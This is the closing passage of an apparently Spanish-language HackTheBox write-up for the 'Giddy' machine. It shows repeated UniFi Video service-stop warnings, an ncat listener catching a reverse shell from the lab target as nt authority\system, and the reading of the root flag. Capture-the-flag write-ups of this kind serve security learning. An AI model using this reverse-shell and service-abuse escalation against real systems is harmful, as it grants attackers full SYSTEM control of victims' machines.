WARNING: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
WARNING: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
WARNING: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
WARNING: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
WARNING: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
WARNING: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
WARNING: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
WARNING: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
```

Shell3:
```
xbytemx@laptop:~/htb/giddy$ ncat -vnlp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
Ncat: Connection from 10.10.10.104.
Ncat: Connection from 10.10.10.104:50970.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\ProgramData\unifi-video>whoami
whoami
nt authority\system

C:\ProgramData\unifi-video>cd c:\Users\Administrator\Desktop
cd c:\Users\Administrator\Desktop
```

# root.txt

> c:\Users\Administrator\Desktop\>type root.txt

... We got root flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
